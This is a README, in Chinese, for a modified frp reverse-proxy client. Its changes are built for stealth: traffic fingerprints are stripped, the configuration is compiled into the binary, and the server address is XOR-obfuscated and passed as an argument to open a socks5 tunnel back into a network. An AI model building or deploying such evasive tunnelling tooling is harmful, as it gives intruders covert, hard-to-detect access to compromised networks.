# frp-Modify

## Todo
- [x] 去除基本流量特征
- [x] 配置文件写入源码
- [x] 通过参数传入IP
- [x] 隐藏IP：传入加密字符串解析成IP
- [ ] 钉钉上线提醒

## Usage
- 在`cmd/frpc/sub/root.go#getFileContent()`函数中，按需修改 FRPC 配置和`key`（默认`testkey`）

```Go
func getFileContent(ip string, port string) {
	key := "testkey"
	ip = str2xor(ip, key)
	port = str2xor(port, key)

	var configContent string = `[common]
    server_addr = ` + ip + `
    server_port = ` + port + `
	tls_enable = true 
	[plugin_socks]
	type = tcp
	remote_port = 7788
	plugin = socks5
	`
	fileContent = configContent
}

```

- 确保安装 Go 和 GCC 环境，然后运行`package.sh`进行交叉编译
```bash
$ ./package.sh

```

- FRPS正常运行，FRPC则需要传入异或后的字符串。可通过`xor.py`脚本进行异或，异或后的字符串存在特殊字符`\`，因此建议使用双引号包裹

```bash
$ ./frpc -t <IP> -p <端口>

$ ./frpc -t "E\AZZSAZTBEET" -p "CUCD"  # 192.168.111.1:7000

```

![](./frp-1.jpg)

## 参考
- [FRP改造计划](https://uknowsec.cn/posts/notes/FRP%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92.html)
